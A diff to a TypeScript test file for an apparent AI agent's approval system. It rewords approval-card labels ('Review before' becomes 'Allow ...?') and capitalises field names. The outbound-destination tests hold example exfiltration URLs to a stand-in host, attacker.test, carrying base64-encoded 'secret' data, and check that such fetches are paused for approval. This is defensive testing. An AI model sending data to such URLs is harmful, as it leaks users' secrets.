@@ -1672,8 +1672,8 @@ describe("Composio batches", () => {
       f.pauseRunForInput.mock.calls as unknown as [{ blocks: Array<Record<string, unknown>> }][]
     )[0]?.[0].blocks[0];
     expect(card).toMatchObject({
-      text: "Review before GMAIL_SEND_EMAIL, …",
-      detail: "GMAIL_SEND_EMAIL\nto: a@example.com\n…",
+      text: "Allow Gmail send email, …?",
+      detail: "Gmail send email\nTo: a@example.com\n…",
     });
   });
 
@@ -3043,7 +3043,7 @@ describe("routine event approval", () => {
     ]);
     await f.run();
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
-    expect(askDetail(f)).toContain('on: {"webhook":true}');
+    expect(askDetail(f)).toContain('On: {"webhook":true}');
     // The approval is recorded for the same short form the card shows.
     const recorded = f.effects.find((effect) => effect.kind === "schedule_create")?.request;
     expect((recorded as { on?: unknown } | undefined)?.on).toEqual({ webhook: true });
@@ -3250,8 +3250,8 @@ describe("outbound destinations", () => {
     expect(f.fetchedUrls).toEqual(["https://example.com/pricing"]);
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
     expect(pausedCard(f)).toMatchObject({
-      text: "Review before web_fetch → attacker.test",
-      detail: "url: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
+      text: "Allow Web fetch → attacker.test?",
+      detail: "URL: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
       site: "attacker.test",
       actions: [
         { id: "allow", label: "Allow once" },
@@ -3272,7 +3272,7 @@ describe("outbound destinations", () => {
       expect(isApprovalPausedResult(f.results[0])).toBe(true);
       expect(pausedCard(f)).toMatchObject({
         site: "ada.li",
-        detail: "url: https://ada.li/",
+        detail: "URL: https://ada.li/",
       });
     },
   );
@@ -3434,7 +3434,7 @@ describe("outbound destinations", () => {
     await f.run();
     expect(f.fetchedUrls).toEqual([]);
     expect(isApprovalPausedResult(f.results[0])).toBe(true);
-    expect(pausedCard(f)).toMatchObject({ detail: "url: https://attacker.test/?q=c2VjcmV0" });
+    expect(pausedCard(f)).toMatchObject({ detail: "URL: https://attacker.test/?q=c2VjcmV0" });
     expect(f.effects[0]?.request).toEqual({ url: "https://attacker.test/?q=c2VjcmV0" });
   });
 
